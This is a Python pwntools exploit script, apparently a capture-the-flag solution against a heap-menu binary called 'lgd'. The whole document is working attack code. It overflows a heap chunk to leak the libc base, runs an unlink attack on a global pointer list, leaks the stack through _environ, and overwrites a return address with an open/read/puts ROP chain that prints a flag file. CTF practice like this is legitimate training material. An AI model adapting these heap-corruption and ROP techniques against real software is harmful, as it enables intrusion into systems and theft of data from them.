#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'lgd'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'
#libFile = './libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('>> ', str(1))
	sla('_?', str(size))
	sa('no?', data)

def rm(idx):
	sla('>> ', str(2))
	sla('?', str(idx))

def dp(idx):
	sla('>> ', str(3))
	sla('?', str(idx))

def md(idx, data):
	sla('>> ', str(4))
	sla('?', str(idx))
	sa('?', data)

def q():
	sla('>> ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	sla('name?', 'I0gan')
	ad(0x68, 'A' * 0x100) # idx 0
	ad(0x68, 'A' * 0x78) # idx 1
	ad(0x68, 'A' * 0x78) # idx 2
	ad(0x68, 'A' * 0x78) # idx 3

	
	p = 'A' * 0x60
	p += p64(0)
	p += p64(0xe1)
	md(0, p)
	rm(1)
	ad(0x68, 'A' * 0x78)
	dp(2)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x3c4b20 - 88
	li('libc_base ' + hex(lib.address))

	# recover bin
	p = 'A' * 0x60
	p += p64(0)
	p += p64(0x71)
	md(0, p)

	# unlink attack to list
	ad(0x80, 'A') #idx 4
	# fake chunk
	plist = 0x6032f8
	p = p64(0)
	p += p64(0x61)
	p += p64(plist - 0x18)
	p += p64(plist - 0x10)
	p += p64(0x60)
	p = p.ljust(0x60, '\x00')
	p += p64(0x60)
	p += '\x90'
	md(3, p)
	rm(4)

	# leak stack
	'''
	in exe
	4023b3 : pop rdi ; ret
	4023b1 : pop rsi ; pop r15 ; ret
	400711 : ret

	in libc
	0x33544 : pop rax ; ret


	read
	1 RDI  0x0
	2 RSI  0x7fffffffec18 —▸ 0x402327 
	3 RDX  0x78

	'''
	pop_rdi = 0x4023b3
	pop_rsi_r15 = 0x4023b1
	ret = 0x400711
	pop_rax = lib.address + 0x33544
	pop_rdx = lib.address + 0x1b92

	md(3, p64(lib.sym['_environ']))
	dp(0)
	environ = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	li('environ ' + hex(environ))
	md_ret = environ - (0xee38 - 0xec18)
	li('md_ret ' + hex(md_ret))

    # rop
	md(3, p64(md_ret))
	puts_plt = exe.plt['puts']
	# creat rop
	flag = md_ret + 0x8 * 19
	p = p64(pop_rdi) + p64(flag)
	p += p64(pop_rsi_r15) + p64(0) + p64(0)
	p += p64(pop_rdx) + p64(0)
	p += p64(lib.sym['open']) # 8
	
	# read
	p += p64(pop_rdi) + p64(0x3)
	p += p64(pop_rsi_r15) + p64(flag) + p64(0)
	p += p64(pop_rdx) + p64(0x60)
	p += p64(lib.sym['read']) # 8
	
	p += p64(pop_rdi) + p64(flag)
	p += p64(lib.sym['puts'])
	p += './flag\x00'


	sla('>> ', str(4))
	sla('?', str(0))
	#db()
	sa('?', p)



def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
